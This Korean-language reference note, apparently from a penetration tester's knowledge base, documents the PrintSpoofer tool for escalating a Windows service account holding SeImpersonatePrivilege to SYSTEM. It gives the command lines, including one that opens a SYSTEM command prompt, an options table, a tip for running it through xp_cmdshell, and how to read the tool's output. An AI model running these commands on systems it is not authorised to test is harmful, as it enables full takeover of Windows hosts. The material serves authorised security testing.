---
tags:
  - 환경/windows
  - 기능/권한상승
실행환경: ["Windows"]
필요권한: ["SeImpersonatePrivilege가 활성화된 Windows token"]
필요조건: ["대상 Windows build와 arch에 맞는 실행 파일", "쓰기와 실행 가능한 경로"]
결과: ["SYSTEM 명령 실행"]
---

# PrintSpoofer

## 도구 개요

`PrintSpoofer`는 Windows Print Spooler의 named pipe 인증 흐름과 token impersonation을 이용해 `SeImpersonatePrivilege`를 가진 프로세스에서 SYSTEM 자식 프로세스를 실행하는 도구다. SQL Server·IIS 같은 서비스 계정 셸에서 해당 특권을 확인했고 짧은 명령으로 SYSTEM 실행 여부를 검증할 때 사용하기 좋다.

## 필요한 입력과 실행 환경

- 실행 위치: 권한 상승할 Windows 대상 호스트
- 현재 token: `SeImpersonatePrivilege`가 `Enabled`
- 입력 파일: 대상 arch에 맞고 SHA-256을 확인한 PrintSpoofer 실행 파일
- 대상 조건: 실행 파일을 저장·실행할 수 있고 Print Spooler·token 동작이 현재 환경에서 차단되지 않음

## 표준 사용법

```cmd
PrintSpoofer64.exe -c "<COMMAND>"
```

## 대표 예시

### SYSTEM 명령 실행 확인

```cmd
PrintSpoofer64.exe -c "cmd /c whoami"
```

### SYSTEM 명령 프롬프트 실행

```cmd
PrintSpoofer64.exe -i -c cmd
```

비대화형 채널인 `xp_cmdshell`에서는 `-i` 대화형 셸보다 `-c "cmd /c <COMMAND>"` 형식을 사용한다.

## 주요 옵션

| 옵션 | 의미 | 사용하는 상황 |
|---|---|---|
| `-c <COMMAND>` | SYSTEM으로 실행할 명령 지정 | 비대화형 명령 실행과 권한 확인 |
| `-i` | 현재 console·session과 상호작용 시도 | 안정적인 대화형 Windows 세션이 있을 때 |
| `-d <SECONDS>` | named pipe 연결 대기 시간 | 기본 대기 시간으로 인증 흐름이 늦을 때 |

## 도구 고유 출력

| 출력·상태 | 의미 | 다음 확인 |
|---|---|---|
| `Found privilege: SeImpersonatePrivilege` | 현재 token에 필요한 특권 발견 | 이 출력만으로 SYSTEM 성공은 아님 |
| `CreateProcessAsUser() OK` | 가장한 token으로 자식 프로세스 생성 성공 | 자식 명령의 `whoami`가 SYSTEM인지 확인 |
| `nt authority\system` | 검증 명령이 SYSTEM으로 실행됨 | [[고권한 세션 확보 후 후속 판단]] |
| pipe·token·process 생성 오류 | 현재 build·token·서비스 상태에서 실패 | 오류가 발생한 API 단계와 보안 제품 차단 확인 |


## 참고 링크
- [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
## 관련 공격기법

- [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]
